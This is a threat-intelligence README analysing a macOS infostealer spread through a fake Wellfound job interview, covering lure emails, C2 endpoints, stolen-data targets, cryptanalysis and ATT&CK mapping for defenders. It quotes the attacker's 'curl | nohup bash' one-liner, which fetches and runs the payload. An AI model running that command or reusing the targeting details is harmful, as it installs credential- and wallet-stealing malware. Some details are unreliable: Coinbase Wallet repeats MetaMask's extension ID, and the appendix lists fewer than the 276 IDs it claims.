# HyperHives macOS Infostealer — Full Technical Analysis

[![Validate Repository](https://github.com/Darksp33d/hyperhives-macos-infostealer-analysis/actions/workflows/validate.yml/badge.svg)](https://github.com/Darksp33d/hyperhives-macos-infostealer-analysis/actions/workflows/validate.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![STIX 2.1](https://img.shields.io/badge/STIX-2.1-informational)](stix/bundle.json)
[![ATT&CK Navigator](https://img.shields.io/badge/ATT%26CK-Navigator_Layer-red)](attack-navigator-layer.json)

> **Threat intelligence:** Rust-based macOS universal binary infostealer delivered through a **fake job interview pipeline on Wellfound** (formerly AngelList). The operator persona "Felix" from "HyperHive" lured targets into running a malicious installer from `macos.hyperhives.net`. This repository documents complete static analysis: **571 encrypted configuration values recovered**, including C2 URLs, a Sentry DSN, and **276 targeted Chrome extension IDs**.

| | |
|---|---|
| **Sample SHA-256** | `5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3` |
| **C2 Domain** | `cloudproxy.link` |
| **Delivery Domain** | `macos.hyperhives.net` |
| **Lure platform** | Wellfound (formerly AngelList) |
| **Operator persona** | "Felix" at "HyperHive" |
| **VirusTotal** | [9 / 63 detections](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3) |
| **Classification** | Public disclosure / IOC bundle |
| **Last updated** | April 2026 |

---

## Contents

- [Threat-intelligence bundles](#threat-intelligence-bundles)
- [Repository layout](#repository-layout)
- [Quick start](#quick-start)
- [TL;DR](#tldr)
- [1 — How it started](#1--how-it-started)
- [2 — The binary](#2--the-binary)
- [3 — What it steals](#3--what-it-steals)
- [4 — Decrypted C2 infrastructure](#4--decrypted-c2-infrastructure)
- [5 — Attribution](#5--attribution)
- [6 — Cryptanalysis](#6--cryptanalysis)
- [7 — MITRE ATT&CK mapping](#7--mitre-attck-mapping)
- [8 — Wallet and extension-ID reference](#8--wallet-and-extension-id-reference)
- [9 — Recommended actions](#9--recommended-actions)
- [10 — Methodology](#10--methodology)
- [Appendix A — All 276 Chrome extension IDs](#appendix-a--all-276-chrome-extension-ids)
- [Scope and limitations](#scope-and-limitations)
- [Release history](#release-history)
- [Contributing](#contributing)
- [License](#license)

---

## Threat-intelligence bundles

| File | Format | Purpose |
|------|--------|---------|
| [`iocs.txt`](iocs.txt) | Plain text | Hashes, domains, URLs, IPs, email, Sentry IDs — paste into blocklists, MISP, OpenCTI |
| [`yara_rules.yar`](yara_rules.yar) | YARA 4.2+ | Known-sample hash match + heuristic string detections for Mach-O |
| [`sigma_rules.yml`](sigma_rules.yml) | Sigma | Proxy, DNS, and process-creation rules — tune `logsource` for your SIEM |
| [`stix/bundle.json`](stix/bundle.json) | STIX 2.1 | Machine-readable CTI bundle with indicators, malware SDO, infrastructure, ATT&CK patterns, and relationships |
| [`attack-navigator-layer.json`](attack-navigator-layer.json) | ATT&CK Navigator | Import into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visual technique coverage |

---

## Repository layout

```
.
├── README.md                      # This report
├── iocs.txt                       # Flat IOC list
├── yara_rules.yar                 # YARA detection rules
├── sigma_rules.yml                # Sigma detection rules
├── stix/
│   └── bundle.json                # STIX 2.1 threat-intelligence bundle
├── attack-navigator-layer.json    # ATT&CK Navigator layer
├── output/
│   ├── full_decrypted_config.json # Machine-readable decrypted configuration
│   ├── iocs.json                  # Structured IOC export
│   ├── c2_protocol.txt            # C2 protocol field documentation
│   ├── cargo_dependencies.txt     # Embedded Rust crate list (97 crates)
│   ├── source_map.txt             # Reconstructed source-file layout
│   └── targets.txt                # Targeted applications and data paths
├── scripts/
│   ├── decrypt_all.py             # Definitive config decryptor (Unicorn emulation)
│   ├── analyze.py                 # Static analysis driver
│   ├── extract_all.py             # String and structure extractor
│   ├── r2_analyze.py              # Radare2 analysis automation
│   ├── r2_targeted.py             # Targeted R2 analysis for helpers
│   └── validate_repo.py           # CI validation script
├── sample/
│   └── README.md                  # Instructions for sample placement
├── Dockerfile                     # Analysis container image
├── docker-compose.yml             # Air-gapped compose config
├── lab.sh                         # Helper script for Docker lab
├── SECURITY.md                    # Safe handling and vulnerability reporting
├── CONTRIBUTING.md                # Contribution guidelines
├── CHANGELOG.md                   # Release history
├── LICENSE                        # MIT
└── .github/
    ├── workflows/validate.yml     # CI: YARA + Sigma + file checks
    ├── ISSUE_TEMPLATE/            # Structured issue forms
    └── PULL_REQUEST_TEMPLATE.md   # PR checklist
```

---

## Quick start

Place the sample as `sample/installer_binary` (see [`sample/README.md`](sample/README.md) for hash verification), then:

```bash
docker compose build
docker compose run --rm lab python3 /lab/scripts/decrypt_all.py
```

The compose file enforces `network_mode: none`, `read_only: true`, and drops all Linux capabilities. See [`SECURITY.md`](SECURITY.md) for full handling guidelines.

---

## TL;DR

A job posting on **Wellfound** (formerly AngelList) led to a multi-email social-engineering chain from an operator persona **"Felix"** at **"HyperHive"**. After flattering the target's technical background and scheduling a fake interview, the attacker directed the victim to "review the product" at `hyperhives.net` and specifically examine **Settings → Diagnostics → Log** — a pretext to trigger execution of:

```
curl -s https://macos.hyperhives.net/install | nohup bash &
```

The payload is an **8.5 MB Mach-O universal binary** (x86_64 + arm64) compiled in Rust. Static analysis with an air-gapped Docker lab and CPU emulation of **570 unique x86_64 helper routines** recovered **all 571 encrypted configuration values**, exposing:

- **C2:** `cloudproxy.link` — four HTTPS endpoints
- **Sentry (attribution pivot):** full DSN with org/project IDs on `ingest.de.sentry.io`
- **Build identity:** Cargo user `rootr`, codename `force`, version `9.12.1`
- **Targets:** 276 Chrome extension IDs (crypto wallets, password managers, corporate credentials)

Tactics align with **DPRK-linked Contagious Interview** campaigns — fake job recruiting on legitimate platforms, multi-step trust building, `curl | bash` delivery, Rust macOS stealer, and crypto-focused exfiltration.

---

## 1 — How it started

### The lure: fake job interview on Wellfound

The attack began with a **legitimate-looking job posting on Wellfound** (formerly AngelList). After the target applied, the following email chain ensued from an operator using the persona **"Felix"** and the company name **"HyperHive"**:

**Email 1** (April 4, 2026) — Initial contact. "Felix" acknowledged the target's CV and LinkedIn, claimed their "Tech Lead" approved moving forward, and specifically referenced the target's real technical experience. The email said HyperHive was "building the desktop version of Hyperhives across different operating systems" and invited the target to schedule an interview in UTC+0.

**Email 2** (April 5, 2026) — Follow-up scheduling. Proposed a specific interview slot (April 8 at 15:00 UTC) and included the critical payload delivery instruction:

> *"If you are able to, please also take a quick look at the product log under **Settings → Diagnostics → Log**. We may ask for a few brief comments on the log and any other product observations you notice, as this often gives a good signal of engineering experience and attention to detail."*

This directed the target to `https://hyperhives.net`, where navigating to the diagnostics section triggered:

```
curl -s https://macos.hyperhives.net/install | nohup bash &
```

### What happened next

The command downloaded and executed an 8.5 MB Mach-O universal binary. A **fake macOS password dialog** appeared via AppleScript. **The password was not entered.** Processes were immediately terminated and the sample was preserved for analysis.

### Social-engineering tradecraft summary

| Element | Detail |
|---------|--------|
| **Platform** | Wellfound (AngelList) — legitimate job board |
| **Company name** | "HyperHive" (singular) / domain `hyperhives.net` |
| **Persona** | "Felix" |
| **Contact email** | `collabs@hyperhives.net` |
| **Trust building** | Referenced target's real CV, LinkedIn, and specific technical skills |
| **Pretext** | "Review the product before the interview" |
| **Payload trigger** | "Check Settings → Diagnostics → Log" on `hyperhives.net` |
| **Scheduling** | Fake interview slot (April 8, 15:00 UTC) to maintain urgency |
| **Multi-step chain** | At least 2 emails over 2 days before payload delivery |

---

## 2 — The binary

| Property | Value |
|----------|-------|
| **File** | `installer_binary` |
| **Size** | 8,504,768 bytes |
| **Format** | Mach-O Universal (x86_64 + arm64) |
| **SHA-256** | `5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3` |
| **SHA-1** | `2de897066c2fc7db91da78d7f9ded99237345077` |
| **MD5** | `0e95ab4038ec48657563c96bed840dd5` |
| **Compiler** | rustc 1.87.0 (stable) |
| **Build user** | `rootr` (from embedded path `/Users/rootr/.cargo/registry/...`) |
| **Build codename** | `force` |
| **Build version** | `9.12.1` |
| **Error tracking** | Sentry Rust SDK v0.36.0 |
| **Crate count** | 97 (see `output/cargo_dependencies.txt`) |

The sample exhibits production-grade engineering: semantic versioning, Sentry integration for operational reliability, and a large embedded configuration encrypted with 570 unique helper functions.

### VirusTotal coverage

**[Full report](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3)** — 9 / 63 engines detected as of initial submission (April 2026). Over **85% of engines failed to flag this sample.**

| Engine | Detection name |
|--------|---------------|
| Kaspersky | `HEUR:Trojan-PSW.OSX.HashBreaker.e` |
| DrWeb | `Mac.PWS.JobStealer.1` |
| ESET-NOD32 | `OSX/PSW.Agent.BX Trojan` |
| Microsoft | `Trojan:MacOS/Stealer!AMTB` |
| Avast / AVG | `MacOS:Stealer-BU [Trj]` |
| Elastic | `Malicious (high Confidence)` |
| Cynet | `Malicious (score: 99)` |
| SentinelOne | `Static AI - Suspicious Mach-O` |

Notable vendor family names for cross-referencing: **HashBreaker** (Kaspersky), **JobStealer** (DrWeb), **PSW.Agent.BX** (ESET), **Stealer-BU** (Avast/AVG).

**Undetected by:** BitDefender, CrowdStrike Falcon, Sophos, Symantec, McAfee, Malwarebytes, TrendMicro, Fortinet, ClamAV, Panda, and 44 other engines. This low detection rate underscores the operational effectiveness of the Rust + custom obfuscation approach used by this campaign.

> Detection ratios change as vendors update signatures. Check the [VirusTotal report](https://www.virustotal.com/gui/file/5c7385c3a4d919d30e81d851d87068dfcc4d9c5489f1c2b06da6904614bf8dd3) for current results.

---

## 3 — What it steals

### Browser data (Chromium-based)

| Browser | Data path | Keychain entry |
|---------|-----------|----------------|
| Chrome | `Google/Chrome` | `Chrome Safe Storage` |
| Brave | `BraveSoftware/Brave-Browser` | `Brave Safe Storage` |
| Opera | default | `Opera Safe Storage` |
| Opera GX | default | `Opera Safe Storage 2023` |
| Vivaldi | default | `Vivaldi Safe Storage` |
| Microsoft Edge | default | `Microsoft Edge Safe Storage` |
| Arc | `Arc/User Data` | — |
| CocCoc | default | `CocCoc Safe Storage` |

**Stolen data types:** passwords, credit cards, cookies, session tokens, autofill, browsing history.

### macOS system data

- **Login Keychain** (`login.keychain-db`) — requires user password harvested via fake dialog
- **Apple Notes** — exfiltrated via AppleScript/osascript
- **Hardware identifiers** — `IOPlatformExpertDevice` / `IOPlatformUUID`, reported as `hardwares` to C2

### Messaging

- **Telegram Desktop** — `tdata` session material for full account takeover

### Crypto wallets (188 logical targets, 276 extension IDs)

Comprehensive targeting of browser-extension wallets including MetaMask, Phantom, Trust Wallet, Ronin, Exodus, OKX, Bybit, Bitget, SubWallet, Ledger Live, and Trezor Suite. Full mapping in [Section 8](#8--wallet-and-extension-id-reference) and `output/full_decrypted_config.json`.

### Password managers

| Product | Extension IDs (examples) |
|---------|--------------------------|
| 1Password | `aeblfdkhhhdcdjpifhhbdiojplfjncoa`, `khgocmkkpikpnmmkgmdnfckapcdkgfaf`, `gejiddohjgogedgjnonbofjigllpkmbf` |
| ProtonPass | `ghmbeldphafepmbegfdlkpapadhbakde` |
| Dashlane | `fdjamakpfbbddfjaooikfcpapjohcfmg` |
| Deloitte Credentials | Corporate credential store |

### Evasion and operational controls

| Feature | Detail |
|---------|--------|
| VM detection | `is_vm` flag in C2 JSON |
| Force mode | `force_mode` remote override flag |
| Gatekeeper bypass | `xattr -c` on downloaded binary |
| VPN awareness | "Please use VPN and retry" error message |

### Exfiltration

Data staged under `~/Documents/temp_data/Application/`, compressed to ZIP, uploaded via `multipart/form-data` over HTTPS. Victim IP and geolocation resolved via `https://freeipapi.com/api/json`.

---

## 4 — Decrypted C2 infrastructure

### Command and control

| Endpoint | Role |
|----------|------|
| `https://cloudproxy.link/m/opened` | Beacon / activation |
| `https://cloudproxy.link/m/metrics` | Telemetry |
| `https://cloudproxy.link/m/decode` | Instruction / config channel |
| `https://cloudproxy.link/db/debug` | Debug / diagnostics |

### Sentry DSN (operator fingerprint)

```
https://526eff9f8bb7aafd7117ca5e33a6a183@o4509139651198976.ingest.de.sentry.io/4509422649213008
```

| Component | Value |
|-----------|-------|
| **Public key** | `526eff9f8bb7aafd7117ca5e33a6a183` |
| **Organization ID** | `4509139651198976` |
| **Project ID** | `4509422649213008` |
| **Region** | EU — `ingest.de.sentry.io` |

Lawful process with Sentry may recover account registration details, billing records, and access metadata tied to this org/project.

### Geolocation API

`https://freeipapi.com/api/json` — victim IP / country for C2 JSON (`ipAddress`, `countryCode`).

### C2 exfiltration protocol

| Field | Role |
|-------|------|
| `buildName` / `buildVersion` | `force` / `9.12.1` |
| `uid`, `log_id` | Victim / session identifiers |
| `ip`, `geo` | From geolocation API |
| `pers_password` | Fake-dialog password |
| `passwords`, `wallets`, `credits`, `autofills` | Stolen material |
| `is_vm`, `hardwares`, `force_mode` | Environment / control flags |

Upload method: `multipart/form-data`, `application/zip`, connection string `UPLD connect`.

---

## 5 — Attribution

### Indicators of compromise

| Indicator | Value | Source |
|-----------|-------|--------|
| Lure platform | Wellfound (AngelList) | Victim report |
| Operator persona | "Felix" at "HyperHive" | Lure emails |
| Lure website | `hyperhives.net` | Lure emails |
| Sender email | `collabs@hyperhives.net` | Lure emails |
| Delivery domain | `macos.hyperhives.net` | Payload download |
| Delivery IP | `81.28.12.12` (Gcore CDN) | DNS resolution |
| Registrar / email | Tucows; Spacemail | WHOIS / MX |
| **C2 domain** | **`cloudproxy.link`** | **Decrypted from sample** |
| **Sentry DSN** | See [Section 4](#sentry-dsn-operator-fingerprint) | **Decrypted from sample** |
| Build user | `rootr` | Embedded Cargo paths |
| Sample SHA-256 | `5c7385c3...bf8dd3` | File hash |

### Developer handle: `rootr`

Embedded path `/Users/rootr/.cargo/registry/`. OSINT on the handle — [github.com/rootr](https://github.com/rootr) (as of analysis date): listed company "RootR", location Geneva, account created **2024-06-27**, zero public repositories. Consistent with a throwaway or operational profile.

### DPRK / Contagious Interview (analytic assessment)

| TTP | This sample | Reported DPRK-adjacent pattern |
|-----|-------------|--------------------------------|
| **Fake job recruiting on legitimate platform** | Wellfound (AngelList) posting → email chain with "Felix" | Contagious Interview: LinkedIn, Indeed, Wellfound fake recruiter outreach |
| **Multi-step social engineering** | 2+ emails referencing real CV, scheduling fake interview | Build trust before payload; documented in multiple DPRK campaigns |
| **Product review / code test pretext** | "Check Settings → Diagnostics → Log" | "Review our project" / "run this code test" pretexts |
| `curl \| bash` delivery | Install one-liner from `macos.hyperhives.net` | Common macOS social-engineering vector |
| Rust Mach-O universal binary | rustc 1.87.0, x86_64 + arm64 | RustDoor / RustBucket / similar clusters |
| Fake password dialog | AppleScript `osascript` | Documented in related macOS campaigns |
| Large crypto wallet target set | 276 extension IDs, 188 wallet names | Financial motivation consistent with DPRK revenue generation |

**Confidence:** **high** for thematic and TTP alignment. The Wellfound fake-job pipeline, multi-email trust chain, product-review pretext, Rust macOS stealer, and crypto-wallet focus match the Contagious Interview playbook closely. This is an analytic assessment, not a government or law-enforcement attribution statement.

---

## 6 — Cryptanalysis

Configuration strings are protected by a **custom XOR cipher**: 570 small x86_64 helper functions (code range `0x10000`–`0x15000`) each compute a unique 16-bit offset from `(data_ptr, seed)`. The offset indexes into the binary to produce a 32-byte XOR key applied to the corresponding ciphertext block.

### Approaches that failed

| Method | Outcome |
|--------|---------|
| Naive XOR sweeps | No coherent plaintext |
| AES / PBKDF2 key guessing | No key schedule found |
| Full-binary Unicorn emulation of the Rust runtime | Control-flow complexity caused divergence |

### Approach that succeeded

1. **Scan** for RIP-relative `LEA` instructions targeting the config region (`0x2b8000`–`0x2bc000`).
2. **Parse** preceding code to extract `(helper_function_address, data_pointer, seed)`.
3. **Emulate** each helper in isolation using [Unicorn Engine](https://www.unicorn-engine.org/) (200 instructions max).
4. **XOR-decrypt** the 32-byte block at the target address using the key at the computed offset.
5. **Extend** for multi-block strings (URLs, DSN) and OR+XOR metadata entries.

**Coverage:** 381 XOR blocks + 190 OR+XOR metadata entries = **571 configuration values recovered** in 1.1 seconds. Zero unrecovered encrypted entries.

**Implementation:** [`scripts/decrypt_all.py`](scripts/decrypt_all.py)

---

## 7 — MITRE ATT&CK mapping

> Import [`attack-navigator-layer.json`](attack-navigator-layer.json) into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for an interactive view.

| Technique | ID | Use in this sample |
|-----------|----|--------------------|
| Phishing | T1566 | Social-engineering email from `collabs@hyperhives.net` |
| User Execution: Malicious File | T1204.002 | `curl \| bash` from lure |
| Command and Scripting Interpreter: AppleScript | T1059.002 | Fake password dialog, Apple Notes exfiltration |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Initial execution via piped bash |
| Credentials from Password Stores: Keychain | T1555.001 | Login keychain extraction |
| Credentials from Password Stores: Credentials from Web Browsers | T1555.003 | Chromium Login Data decryption |
| Steal Web Session Cookie | T1539 | Browser cookie and token theft |
| Data from Local System | T1005 | Wallets, Telegram, Notes, autofill |
| Archive Collected Data | T1560 | ZIP staging under `~/Documents/temp_data/` |
| Exfiltration Over C2 Channel | T1041 | HTTPS POST to `cloudproxy.link` |
| Application Layer Protocol: Web Protocols | T1071.001 | HTTPS C2 with four endpoints |
| Virtualization/Sandbox Evasion | T1497 | `is_vm` flag |
| Obfuscated Files or Information | T1027 | 570 XOR helper functions |
| Input Capture | T1056 | Fake password dialog |
| System Information Discovery | T1082 | Hardware ID and OS version collection |
| System Network Configuration Discovery | T1016 | `freeipapi.com` geolocation |
| Subvert Trust Controls: Gatekeeper Bypass | T1553.001 | `xattr -c` on downloaded binary |

---

## 8 — Wallet and extension-ID reference

188 wallet names and **276 unique** 32-character Chrome extension IDs were recovered. The following table shows high-profile targets; the complete list is in [Appendix A](#appendix-a--all-276-chrome-extension-ids) and `output/full_decrypted_config.json`.

| Wallet | Extension ID |
|--------|--------------|
| MetaMask | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| Trust Wallet | `egjidjbpglichdcondbcbdnbeeppgdph` |
| Ronin | `fnjhmkhhmkbjkkabndcnnogagogbneec` |
| Exodus Web3 | `aholpfdialjgjfhomihkjbmgjidlcdno` |
| OKX | `mcohilncbfahbmgdjkbpemcciiolgcge` |
| Bybit | `pdliaogehgdbhbnmkklieghmmjkpigpa` |
| Bitget | `jiidiaalihmmhddjgbnbgdfflelocpak` |
| SubWallet | `onhogfjeacnfoofkfgppdlbmlmnplgbn` |
| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |

**Desktop wallets:** Ledger Live and Trezor Suite data directories are also targeted.

**Important:** These extension IDs identify **legitimate browser extensions** whose local data the malware targets for theft. They are **not** malicious extensions.

---

## 9 — Recommended actions

### For potential victims

- **Do not** run unknown `curl | bash` one-liners
- Rotate all browser-stored credentials, crypto wallet keys, and password-manager master passwords if exposed
- Check for `~/Documents/temp_data/` on disk
- Report to local law enforcement and relevant national CERT (e.g., IC3, NCSC)

### For defenders

- **Block** `macos.hyperhives.net`, `cloudproxy.link`, and `81.28.12.12` (verify shared-hosting impact before IP blocking)
- **Hunt** for HTTPS traffic to `cloudproxy.link` and DNS queries for both domains
- **Deploy** the YARA and Sigma rules from this repository (tune for your environment)
- **Compare** installed Chrome extensions against the 276-ID list (the extensions are legitimate — the malware reads their local data)
- **Import** `stix/bundle.json` into your CTI platform (MISP, OpenCTI, ThreatConnect, etc.)

### For lawful discovery

| Target | What to request |
|--------|-----------------|
| Sentry | Account and billing records for org `4509139651198976` |
| Domain registrars | WHOIS records for `cloudproxy.link` and `hyperhives.net` |
| Gcore CDN | Access logs for `81.28.12.12` |
| Email provider | Account records for `collabs@hyperhives.net` |
| GitHub | Account metadata for `rootr` |

---

## 10 — Methodology

Analysis was performed in a **Docker container** with:
- `network_mode: none` (no outbound connectivity)
- `read_only: true` (immutable root filesystem)
- All Linux capabilities dropped (`cap_drop: ALL`)
- `no-new-privileges` security option

Tools: Python (LIEF, Unicorn Engine, Capstone, r2pipe), Radare2, and custom scripts. No dynamic execution of the malware was performed — all findings derive from static analysis and isolated CPU emulation of individual helper functions.

Verified artifacts: [`scripts/decrypt_all.py`](scripts/decrypt_all.py), [`output/full_decrypted_config.json`](output/full_decrypted_config.json).

---

## Appendix A — All 276 Chrome extension IDs

The malware configuration references these extension IDs (local-storage / LevelDB paths under user profiles). **These IDs identify legitimate extensions targeted for data theft, not malicious extensions.**

```
abkahkcbhngaebpcgfmhkoioedceoigp  abogmiocnneedmmepnohnhlijcjpcifd
acmacodkjbdgmoleebolmdjonilkdbch  aeachknmefphepccionboohckonoeemg
aeblfdkhhhdcdjpifhhbdiojplfjncoa  afbcbjpbpfadlkmhmclhkeeodmamcflc
afccgfbnbpgfdokbllhiccepgggofoco  aflkmfhebedbjioipglgcbcmnbpgliof
agoakfejjabomempkjlepdflaleeobhb  ahkpfejaeoepmfopmbhjgjekibmfcfgo
aholpfdialjgjfhomihkjbmgjidlcdno  aiifbnbfobpmeekipheeijimdpnlpgpp
aijcbedoijmgnlmjeegjaglmepbmpkpi  ajofhbfomojicfifgoeeimefklkfdkfn
ajopcimklncnhjednieoejhkffdolemp  akckefnapafjbpphkefbpkpcamkoaoai
akkmagafhjjjjclaejjomkeccmjhdkpa  algblmhagnobbnmakepomicmfljlbehg
amdcajcnofodjpgbbdnnjkffamfnidae  amkmjjmmflddogmhpjloimipbofnfjih
ammjlinfekkoockogfhdkgcohjlbhmff  anokgmphncpekkhclmingpimjmcooifb
aodkkagnadcbobfpggfnjeongemjbjca  aoedbjimepepemdafoodplnknfkmbnle
apgjfbcibghlclbdiipmojppngeilcol  bbjmepflljbbfaehppakknfgdnojoled
bccippoanbhflmokhkbkepmhmndijenh  bcpialkijhffpgnmgjhjmdeabdbbfmbo
bdgmdoedahdcjmpmifafdhnffjinddgc  bfeplaecgkoeckiidkgkmlllfbaeplgm
bflldjbbpcjgooclhpmhdhioebmnnkcm  bfnaelmomeimhlpmgjnjophhpkkoljpa
bgjogpoidejdemgoochpnkmdjpocgkha  bhhhlbepdkbapadjdnnojkbgioiodbic
bhmbcdekobebkhmloafbjfdcphbmpcnm  bidcmgjdfgkagkleecdockomdjlgglbg
bifidjkcdpgfnlbcjpdkdcnbiooooblg  blnieiiffboillknjnepogjhkgnoapac
bmkakpenjmcpfhhjadflneinmhboecjf  bmmhjnaohafphhlecmkkiaaglcebcapn
bodadjcgfgigmmnambomndppidgdjlni  bplepbelihejfpcjoeialhjpamgpnfln
caalbmclnkldkcgcdkfiapoopikbofnl  cgeeodpfagjceefieflmdfphplkenlfk
cihmoadaighcejopammfbmddcmdekcje  ciojocpkclfflombbcfigcijjcbkmhaf
cjelfplplebdjjenllpjcblmjkfcffne  ckklhkaabbmdjkahiaaplikpdddkenic
cmbagcoinhmacpcgmbiniijboejgiahi  cmoakldedjfnjofgbbfenefcagmedlga
cnmbailpgmdagpofalkeoeooefdkjfdl  cnncmdhjacpkmjmkcafchppbnpnhdmon
cnoepnljjcacmnjnopbhjelpmfokpijm  codfcglpplgmmlokgilfkpcjnmkbfiel
cpmkedoipcpimgecpmgpldfpohjplkpp  dbgnhckhnppddckangcjbkjnlddbjkna
dcbjpgbkjoomeenajdabiicabjljlnfp  dfbacijefbcabjnngipfnbhcpoldlkcg
dkdedlpgdmmkkfjabffeganieamfklkm  dlcobpjiigpikoobohmabehhmhfoodbb
dldjpboieedgcmpkchcjcbijingjcgok  dmjmllblpcbmniokccdoaiahcdajdjof
dngmlblcodfobpdpecaadgfbcggfjfnm  dpcklmdombjcplafheapiblogdlgjjlb
dpdmipjakdiapplcecdmgckknipnfjph  dpealdfjgahljjdekeiadjnfgpijffhg
dpmfhilhjlhhakpbieclcghochdofeao  eaeecbmeajhliilmacefcgjnnijkkfki
ebaeifdbcjklcmoigppnpkcghndhpbbm  ebfidpplhabeedpnhjnobghokpiioolj
efbglgofoippbgcjepnhiblaibcnclgk  egjidjbpglichdcondbcbdnbeeppgdph
ehgjhhccekdedpbkifaojjaefeohnoea  ehjiblpccbknkgimiflboggcffmpphhp
ejbalbakoplchlghecdalmeeeajnimhm  ejbidfepgijlcgahbmbckmnaljagjoll
ejdmhlhkcfbkcoifejkcbonhodkgflgg  ejjladinnckdgjemekebdpeokbikhfci
elalghlhoepcjfaedkcmjolahamlnjcp  eljobehkpcnpekmbcjiidekjhkbcnpkf
ellkdbaphhldpeajbepobaecooaoafpg  emafjfadeeammocialbgjbaeldmpddne
emeeapjkbcbpbpgaagfchmcgglmebnen  emgcpdnckldpdhjgmkeeahfaokmhgpab
enabgbdfcbaehmbigakijjabdpdnimlg  epapihdplajcdnnkdeiahlgigofloibg
fajmdbbmcncahahilpfdiacamedmgdlk  fbplgegfggencanbeceipjpanlmgpkfi
fcckkdbjnoikooededlapcalpionmalo  fcfcfllfndlomdhbehjjcoimbgofdncg
fcjkomdnccnlklmhncgmaehaakjkddnk  fdchdcpieegfofnofhgdombfckhbcokj
fdcnegogpncmfejlfnffnofpngdiejii  fdjamakpfbbddfjaooikfcpapjohcfmg
fhbohimaelbohpjbbldcngcnapndodjp  fhilaheimglignddkjgofkcbgekhenbh
fhmmkjofdcpnoklcbcnbjjhigobceikb  fihkakfobkmkjojpchpfgcmhfjnmnfpi
fijngjgcjhjmmpcmkeiomlglpeiijkld  fjghjobbfggoacelnibacipoilennobn
fldfpgipfncgndfolcbkdeeknbbbnhcc  fmpbldieijjehhalgjblbpgjmijencll
fnabdmcgpkkjjegokfcnfbpneacddpfh  fnjhmkhhmkbjkkabndcnnogagogbneec
fnnegphlobjdpkhecapkijjdkgcjhkib  fopmedgnkfpebgllppeddmmochcookhc
fpibioaihcagphbidhodidjbnclocgll  fpkhgmpbidmiogeglndfbkegfdlnajnf
gbjepgaebckfidagpfeioimheabiohmg  gdokollfhmnbfckbobkdbakhilldkhcj
gejiddohjgogedgjnonbofjigllpkmbf  ghihpcdpbjaaomhlfnhdlocimojkinpm
ghlmndacnhlaekppcllcpcjjjomjkjpg  ghmbeldphafepmbegfdlkpapadhbakde
gjlmehlldlphhljhpnlddaodbjjcchai  gkeelndblnomfmjnophbhfhcjbcnemka
gkhnjcpkikkkfhhdhhphcbhmkikoicgn  gkpbmnplcjdnnmmiaaphofhdiicdhfah
glhefpglgefbmegkpjkdgoikologepdl  hbbgbephgojikajhfbomhlmmollphcad
hbdheoebpgogdkagfojahleegjfkhkpl  hbinmkhlebcnghpikoekkbeljbealbje
hbneiaclpaaglopiogfdhgccebncnjmc  hbnpcbochkgodkmmicbhfpmmkhbfbhim
hddkffjleepiafmkhcneldjipkfkkofk  hdokiejnpimakedhajhdlcegeplioahd
heefohaffomkkkphnlpohglngmbcclhi  hgbeiipamcgbdjhfflifkgehomnmglgk
hgnpaljkalilofmmbhgkkldbdbogddlo  hifafgmccdpekplomjjkcfgodnhcellj
hlbmghfhijdlnllnnnakmcagdfhhkfna  hmeobnfnfcmdkdcmlblgagmfpfboieaf
hnfanknocfeofbddgcijnmhnfnkdnaad  hnhobjmcibchnmglfbldbfabcgaknlkj
hpbgcgmiemanfelegbndmhieiigkackl  hpclkefagolihohboafpheddmmgdffjm
hpglfhgfnhbgpjdenjgmdgoeiappafln  hpjiiechbbhefmpggegmahejiiphbmij
ibjflpbmadchofnbpppegdbnifdgincp  ibljocddagjghmlpgihahamcghfggcjc
ibnejdfjmmkpcnlpebklmnkoeoihofec  icmkfkmjoklfhlfdkkkgpnpldkgdmhoe
idnnbdplmphpflfnlkomgpfbpcgelopg  idpfplgehakelkdadhcacicjjbemjbke
ifckdpamphokdglkkdomedpdegcjhjdp  ifclboecfhkjbpmhgehodcjpciihhmif
ifgjklbmlnimhldbmddmkdhoahfocppf  ikcpjgihikfinlkobegiiogdigohmfam
ilhaljfiglknggcoegeknjghdgampffk  imlcamfeniaidioeflifonfjeeppblda
iokeahhehimjnekafflcihljlcjccdbe  jaooiolkmfcmloonphpiiogkfckgciom
jbdaocneiiinmjbjlgalhcelgbejmnid  jccapkebeeiajkkdemacblkjhhhboiek
jfdlamikmbghhapbgfoogdffldioobgl  jfflgdhkeohhkelibbefdcgjijppkdeb
jhjebgdkdemiibiibgickfkilfpbelaj  jhnilbocebbmeelaolalihfokjgdmogb
jicpmdkafljkkppgpellcjhfhdmjpogm  jiepnaheligkibgcjgjepjfppgbcghmp
jiidiaalihmmhddjgbnbgdfflelocpak  jjkhekbaikcnpnhflnnlnbonkkobkiim
jljjeghmeihjegifdhbghcoihdiegkkl  jmgipjhlmabpmcikcahmmgleghckefjg
jnggcdmajcokeakpdeagdhphmkioabem  jnldfbidonfeldmalbflbmlebbipcnle
jnlgamecbpmbajjfhmmmlhejkemejdma  jojhfeoedkpkglbfimdfabpdfjaoolaf
kdgponmicjmjiejhifbjgembdcaclcib  keenhcnmdmjjhincpilijphpiohdppno
kfdniefadaanbjodldohaedphafoffoh  kgdijkcfiglijhaglibaidbipiejjfdp
khgocmkkpikpnmmkgmdnfckapcdkgfaf  khpkpbbcccdmmclmpigdgddabeilkdpd
kilnpioakcdndlodeeceffgjdpojajlo  kjjebdkfeagdoogagbhepmbimaphnfln
kkpehldckknjffeakihjajcjccmcjflh  kkpllbgjhchghjapjbinnoddmciocphm
kkpllkodjeloidieedojogacfhpaihoh  klghhnkeealcohjjanjjdaeeggmfmlpl
kmphdnilpmdejikjdnlbcnmnabepfgkh  kncchdigobghenbbaddojjnnaogfppfj
kolfcecahpbgbilkdkalabnfjjklkkae  kpfopkelmapcoipemfendmdcghnegimn
kppfdiipphfccemcignhifpjkapfbihd  kppgpfphbmbcgeglphjnhnhibonmebkn
